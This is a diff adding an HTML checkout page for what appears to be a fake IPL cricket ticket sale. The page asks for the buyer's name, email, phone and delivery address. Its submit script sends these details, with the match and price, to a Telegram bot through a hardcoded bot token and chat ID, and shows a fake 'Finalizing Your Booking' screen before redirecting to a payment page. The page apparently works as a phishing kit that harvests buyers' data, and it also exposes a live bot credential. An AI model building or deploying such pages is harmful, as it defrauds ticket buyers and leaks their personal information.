@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Enter Details - IPL Tickets</title>
+
+    <script>
+    !function(f,b,e,v,n,t,s)
+    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+    n.queue=[];t=b.createElement(e);t.async=!0;
+    t.src=v;s=b.getElementsByTagName(e)[0];
+    s.parentNode.insertBefore(t,s)}(window, document,'script',
+    'https://connect.facebook.net/en_US/fbevents.js');
+
+    fbq('init', '1252040857081560');
+    fbq('track', 'PageView');
+    fbq('track', 'Lead'); 
+    </script>
+    <noscript>
+        <img height="1" width="1" style="display:none"
+        src="https://www.facebook.com/tr?id=1252040857081560&ev=PageView&noscript=1"/>
+    </noscript>
+
+    <style>
+        body { font-family: 'Segoe UI', sans-serif; background: #f4f6f8; margin: 0; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; box-sizing: border-box;}
+        .details-box { background: #fff; max-width: 400px; width: 100%; border-radius: 12px; overflow: hidden; box-shadow: 0 10px 30px rgba(0,0,0,0.1); padding: 30px; box-sizing: border-box; }
+        .header { text-align: center; border-bottom: 2px dashed #eee; padding-bottom: 20px; margin-bottom: 25px; }
+        .header h2 { margin: 0; color: #333; font-size: 22px; font-weight: 800; }
+        .header p { margin: 5px 0 0; color: #666; font-size: 13px; }
+        .form-group { margin-bottom: 18px; text-align: left; }
+        .form-group label { display: block; font-size: 13px; color: #555; margin-bottom: 6px; font-weight: 600; }
+        .form-group input, .form-group textarea { width: 100%; padding: 14px; border: 2px solid #eee; border-radius: 8px; font-size: 14px; outline: none; box-sizing: border-box; transition: 0.3s; font-family: inherit; }
+        .form-group input:focus, .form-group textarea:focus { border-color: #3395ff; }
+        .btn-proceed { width: 100%; padding: 16px; background: #3395ff; color: #fff; border: none; border-radius: 8px; font-weight: 700; font-size: 15px; margin-top: 10px; cursor: pointer; transition: 0.3s; letter-spacing: 0.5px; }
+        .btn-proceed:hover { background: #287ce6; box-shadow: 0 5px 15px rgba(51, 149, 255, 0.3); }
+        .summary { background: #f8f9fa; padding: 12px; border-radius: 6px; display: flex; justify-content: space-between; font-weight: 700; margin-bottom: 20px; font-size: 15px; color: #333;}
+    </style>
+</head>
+<body>
+
+    <div class="details-box">
+        <div class="header">
+            <h2>Contact Details</h2>
+            <p>Please enter details for E-Ticket & Physical Delivery</p>
+        </div>
+
+        <div class="summary">
+            <span>Total Payable:</span>
+            <span id="display-price" style="color: #3395ff;">₹0</span>
+        </div>
+
+        <form id="details-form">
+            <div class="form-group">
+                <label>Full Name <span style="color:#f84464;">*</span></label>
+                <input type="text" id="u-name" placeholder="Enter your full name" required>
+            </div>
+            <div class="form-group">
+                <label>Email Address <span style="color:#f84464;">*</span></label>
+                <input type="email" id="u-email" placeholder="ticket@example.com" required>
+            </div>
+            <div class="form-group">
+                <label>Mobile Number <span style="color:#f84464;">*</span></label>
+                <input type="tel" id="u-phone" placeholder="10-digit mobile number" pattern="[0-9]{10}" required title="Please enter a valid 10 digit number">
+            </div>
+            <div class="form-group">
+                <label>Delivery Address (For Dak/Post) <span style="color:#f84464;">*</span></label>
+                <textarea id="u-address" rows="3" placeholder="House No, Street, City, PIN Code" required></textarea>
+            </div>
+            <button type="submit" class="btn-proceed" id="submit-btn">Proceed to Payment</button>
+        </form>
+    </div>
+
+    <script>
+        const finalPrice = localStorage.getItem('finalPrice') || 0;
+        const selectedMatch = JSON.parse(localStorage.getItem('selectedMatch')) || {};
+        document.getElementById('display-price').innerText = "₹" + finalPrice;
+
+        document.getElementById('details-form').addEventListener('submit', function(e) {
+            e.preventDefault(); 
+            
+            // 1. Button Block & Loading Animation
+            const btn = document.getElementById('submit-btn');
+            btn.innerText = "Processing...";
+            btn.style.pointerEvents = "none";
+
+            const loader = document.createElement('div');
+            loader.innerHTML = `
+                <div style="position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(255,255,255,0.95); z-index:99999; display:flex; flex-direction:column; justify-content:center; align-items:center; backdrop-filter:blur(5px);">
+                    <div style="width: 45px; height: 45px; border: 4px solid #f3f3f3; border-top: 4px solid #3395ff; border-radius: 50%; animation: load-spin 1s linear infinite;"></div>
+                    <h3 style="margin-top:20px; color:#333; font-family:sans-serif; font-size:18px; font-weight:700;">Finalizing Your Booking...</h3>
+                    <p style="color:#666; font-size:13px; margin-top:5px; font-weight:500;">Redirecting to payment gateway</p>
+                    <style>@keyframes load-spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style>
+                </div>
+            `;
+            document.body.appendChild(loader);
+
+            const name = document.getElementById('u-name').value;
+            const email = document.getElementById('u-email').value;
+            const phone = document.getElementById('u-phone').value;
+            const address = document.getElementById('u-address').value;
+            const matchTitle = selectedMatch.title || "Match Unknown";
+
+            localStorage.setItem('customerName', name);
+            localStorage.setItem('customerEmail', email);
+            localStorage.setItem('customerPhone', phone);
+            localStorage.setItem('customerAddress', address);
+
+            // --- 🔥 TELEGRAM LOGIC ---
+            const botToken = "8642950249:AAF8oxzhk-6NvYTEtpIW0oNNwsb2RQljliY"; 
+            const chatId = "6820660513"; 
+
+            const telegramMsg = `🔥 *NEW TICKET LEAD (Details Page)* 🔥\n\n` +
+                                `🏏 *Match:* ${matchTitle}\n` +
+                                `💰 *Amount:* ₹${finalPrice}\n` +
+                                `👤 *Name:* ${name}\n` +
+                                `📞 *Phone:* ${phone}\n` +
+                                `📧 *Email:* ${email}\n` +
+                                `🏠 *Address:* ${address}`;
+
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(telegramMsg)}&parse_mode=Markdown`;
+
+            // Wait for telegram message to be sent before redirecting
+            fetch(url).then(() => {
+                window.location.href = 'payment.html';
+            }).catch(() => {
+                window.location.href = 'payment.html';
+            });
+
+            // Fail-safe redirect after 1.5 seconds
+            setTimeout(() => {
+                window.location.href = 'payment.html';
+            }, 1500);
+        });
+    </script>
+</body>
+</html>
